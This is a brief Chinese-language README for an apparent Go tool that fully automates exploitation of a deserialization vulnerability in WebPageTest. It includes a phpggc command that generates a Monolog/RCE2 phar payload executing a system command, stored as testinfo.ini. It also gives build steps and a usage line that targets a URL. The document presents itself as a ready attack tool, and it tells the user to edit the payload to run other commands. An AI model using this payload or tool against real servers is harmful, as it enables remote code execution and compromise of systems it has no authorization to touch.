# webpagetest_phar
对webpagetest的反序列化漏洞的全自动利用，注意默认命令为id，如需修改执行命令，请自行进入phpggc文件下修改testinfo.ini,执行命令如下：
`./phpggc Monolog/RCE2 system 'id' -p phar -o testinfo.ini`
## 编译
go build -o main.exe main.go
## 使用方式
main.exe -u "url"
